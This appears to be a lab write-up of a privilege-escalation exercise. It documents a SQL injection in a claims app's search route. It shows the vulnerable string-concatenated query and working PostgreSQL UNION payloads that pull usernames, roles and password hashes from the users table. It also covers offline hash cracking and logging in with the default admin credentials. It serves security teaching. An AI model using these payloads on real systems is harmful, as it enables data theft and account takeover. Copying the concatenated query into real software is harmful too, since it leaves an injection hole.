# Privilege Escalation 2 — SQL Injection

---

## Vulnerability Summary

The claims search function (`/search-claims`) concatenates user input directly into a raw SQL query without parameterisation or sanitisation. An authenticated normal staff user can inject SQL to extract data from other tables — including other users' claims or user credentials from the `users` table.

### Vulnerable Code

**`app.py` — `/search-claims` route (staff user path):**
```python
# User input directly concatenated into the SQL string
raw_query = "SELECT * FROM claims WHERE user_id = " + str(current_user.id) \
            + " AND title LIKE '%" + search_query \
            + "%' ORDER BY created_at DESC"
```

The resulting SQL query looks like this:

```sql
SELECT * FROM claims WHERE user_id = 1 AND title LIKE '%<INPUT>%' ORDER BY created_at DESC
```

Because `<INPUT>` is inserted directly into the SQL string, an attacker can break out of the `LIKE` string and inject arbitrary SQL.

---

## Exploitation Steps

### Step 1 — Log in as a normal staff user

```
Username: staff_user
Password: staff_pass
```

### Step 2 — Navigate to the search page

Go to **Search Claims** (`/search-claims`).

### Step 3 — Determine the column count

The search input is inserted into the SQL query **once** (in the `title LIKE` clause). The `--` comment operator neutralises everything after it, so the `ORDER BY` clause is removed.

The raw SQL query looks like this:

```sql
SELECT * FROM claims WHERE user_id = <id> AND title LIKE '%INPUT%' ORDER BY created_at DESC
```

The injection point is inside the `LIKE '%…%'` pattern. To break out:
1. Close the `LIKE` string with `'`
2. Inject `UNION SELECT` with the correct number of columns (12)
3. End with `--` (including a **trailing space**) to comment out the remaining `%' ORDER BY created_at DESC`

Test with:

```
x' UNION SELECT 1::int,2::int,3::int,'4','5',6.0,'7','8',now(),now(),11::int,'12' -- 
```

> **Important:** Make sure to include a trailing space after `--`. PostgreSQL requires it for the comment to be valid.

> **Why different type casts?** PostgreSQL requires **exact type matches** in a `UNION`. The first `SELECT *` returns the `claims` table's native types, so the UNION SELECT must match:
> - **Integer** columns (id, user_id, claim_type_id, reviewed_by): use `::int`
> - **Float** column (amount): use a decimal like `6.0`
> - **DateTime** columns (created_at, updated_at): use `now()`
> - **Text/VARCHAR** columns: use plain string values

If the page loads without a "Query error" flash message, the column count is correct.

### Step 4 — Extract usernames and roles

Enter the following payload in the search box:

```
x' UNION SELECT id::int, 0::int, 0::int, username, email, 0.0, role, created_at::text, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
```

> **Why these specific type casts?** The UNION must match the `claims` table's column types exactly:
> - `id::int` → matches `claims.id` (Integer)
> - `0::int` → matches `claims.user_id` and `claims.claim_type_id` (Integer)
> - `username`, `email`, `role` → match VARCHAR/Text columns (no cast needed)
> - `0.0` → matches `claims.amount` (Float)
> - `created_at::text` → matches `claims.additional_details` (Text) — timestamp cast to text
> - `NULL::timestamp` → matches `claims.updated_at` (DateTime)
> - `NULL::int` → matches `claims.reviewed_by` (Integer)

This maps user data to the columns the template renders:

| Template column        | Displays           | `users` value         |
|------------------------|--------------------|-----------------------| 
| ID (`row[0]`)          | User ID            | `id::int`             |
| Title (`row[3]`)       | **Username**       | `username`            |
| Amount (`row[5]`)      | `0.0` placeholder  | `0.0`                 |
| Status (`row[6]`)      | **Role**           | `role`                |
| Submitted (`row[7]`)   | **Created at**     | `created_at::text`    |

Look for a row where the **Title** column shows `oic_admin` and the **Status** column shows `oic`.

### Step 5 — Extract password hashes (separate query)

The password hash cannot be placed in the Amount position (`row[5]`) because the non-raw template path tries to format it as a float (`"%.2f"|format(row[5])`). Use this separate payload to extract hashes:

```
x' UNION SELECT id::int, 0::int, 0::int, password_hash, email, 0.0, role, created_at::text, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
```

This places `password_hash` in the **Title** column (`row[3]`), which renders as plain text.

> Note: The `password_hash` values are Werkzeug hashed passwords (e.g., `scrypt:32768:8:1$...`). Use an offline hash cracker (e.g., hashcat with mode 25600 for Werkzeug scrypt) to recover plaintext passwords.

### Additional — Extract all claims from other users

```
x' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 -- 
```

This returns claims belonging to all other users. Since both SELECTs query the same `claims` table, no type casts are needed — the column types match automatically.

### Step 6 — Log in as the OIC user

Once the OIC password hash is cracked, log in at `/login` with the recovered credentials to gain full OIC privileges.

**Default OIC credentials (for reference):**
```
Username: oic_admin
Password: oic_admin_pass
```
